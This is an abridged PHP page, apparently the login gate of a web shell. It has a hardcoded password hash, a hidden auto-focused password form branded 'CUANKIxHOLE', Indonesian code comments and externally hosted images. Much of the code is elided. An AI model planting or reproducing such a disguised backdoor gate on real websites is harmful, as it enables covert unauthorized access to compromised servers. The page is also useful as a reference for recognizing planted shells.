<?php
session_start();
$password = "d17b58f8e97197b8719e95839231f5f9";
...
<head>
    ...
    <link rel="shortcut icon" type="image/x-icon" href="https://i.postimg.cc/qqwTPqCR/image-Photoroom.png" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ...
        /* Background Foto WebP - Full Layar */
        body {
            background-image: url(https://nikamichi.xyz/images/killuabgcuankixhole.webp);
...
<body>
    ...
    <div class="center-title">CUANKIxHOLE</div>
    <div class="dots-indicator" id="dotsIndicator"></div>

    <form class="hidden-form" action="" method="post" autocomplete="off" id="loginForm">
        <input type="password" name="pass" id="passInput" autofocus>
    </form>
    ...
    <script>
        ...
        // Force focus saat load
        window.addEventListener('load', function() {
            passInput.focus();
        });

        // Fokus balik kalau user klik di mana aja
        ...
        // Fokus balik kalau user ngetik di mana aja
        ...
        // Update titik-titik indikator
        passInput.addEventListener('input', function() {
            const len = passInput.value.length;
            dotsIndicator.textContent = 'â€¢'.repeat(len);
        });

        // WAJIB TEKAN ENTER buat submit
...
<!-- Gambar di tengah -->
<img class="center-image" src="http://nikamichi.xyz/images/cuankixholekilluauntukdidalam.webp" alt="">
<!-- Gambar di pojok kanan atas -->
<img class="top-right-image" src="http://nikamichi.xyz/images/cuankixholekilluauntukdidalam.webp" alt="">
